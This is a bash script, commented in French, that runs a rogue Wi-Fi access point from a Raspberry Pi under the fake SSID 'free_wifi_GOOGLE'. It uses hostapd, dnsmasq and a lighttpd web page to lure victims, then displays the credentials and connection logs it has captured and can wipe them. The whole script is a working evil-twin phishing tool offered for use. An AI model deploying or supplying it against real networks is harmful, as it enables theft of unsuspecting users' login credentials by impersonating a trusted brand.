#!/bin/bash

DIR="/home/pi/pineapple"
CAPTURES="$DIR/captures"
DNSMASQ_CONF="$DIR/dnsmasq.conf"
HOSTAPD_CONF="$DIR/hostapd.conf"
INTERFACE="wlan1"

start_ap() {
  echo "[*] Configuration de l'interface $INTERFACE..."
  sudo ip link set $INTERFACE down
  sudo ip addr flush dev $INTERFACE
  sudo ip addr add 10.0.0.1/24 dev $INTERFACE
  sudo ip link set $INTERFACE up

  echo "[*] Démarrage du serveur web..."
  sudo cp -r "$DIR/www"/* /var/www/html/
  sudo systemctl restart lighttpd

  echo "[*] Lancement de hostapd et dnsmasq..."
  sudo hostapd "$HOSTAPD_CONF" -B
  sudo dnsmasq -C "$DNSMASQ_CONF"

  echo "[✔] Point d'accès lancé : SSID 'free_wifi_GOOGLE'"
}

stop_ap() {
  echo "[*] Arrêt de hostapd, dnsmasq et réinitialisation réseau..."
  sudo pkill hostapd
  sudo pkill dnsmasq
  sudo ip link set $INTERFACE down
  sudo ip addr flush dev $INTERFACE
  sudo ip link set $INTERFACE up
  echo "[✔] Point d'accès arrêté."
}

show_creds() {
  echo -e "\n--- Identifiants capturés ---"
  if [[ -f "$CAPTURES/creds.txt" ]]; then
    cat "$CAPTURES/creds.txt"
  else
    echo "(Aucun identifiant capturé)"
  fi
  echo "------------------------------"
  read -rp "Appuie sur Entrée pour continuer..."
}

show_logs() {
  echo -e "\n--- Journal des connexions ---"
  if [[ -f "$CAPTURES/visits.log" ]]; then
    cat "$CAPTURES/visits.log"
  else
    echo "(Aucune connexion enregistrée)"
  fi
  echo "------------------------------"
  read -rp "Appuie sur Entrée pour continuer..."
}

clean_data() {
  echo "[*] Suppression des logs..."
  rm -f "$CAPTURES/creds.txt" "$CAPTURES/visits.log"
  echo "[✔] Logs supprimés."
  read -rp "Appuie sur Entrée pour continuer..."
}

while true; do
  clear
  echo "=== MENU Wi-Fi Pineapple ==="
  echo "1. Démarrer le faux point d'accès"
  echo "2. Arrêter le faux point d'accès"
  echo "3. Afficher les identifiants capturés"
  echo "4. Afficher les connexions/logs"
  echo "5. Supprimer les logs"
  echo "0. Quitter"
  echo "============================="
  read -rp "Choix : " CHOICE

  case $CHOICE in
    1) start_ap ;;
    2) stop_ap ;;
    3) show_creds ;;
    4) show_logs ;;
    5) clean_data ;;
    0) echo "Bye !"; exit ;;
    *) echo "Choix invalide. Appuie sur Entrée pour réessayer." ; read ;;
  esac
done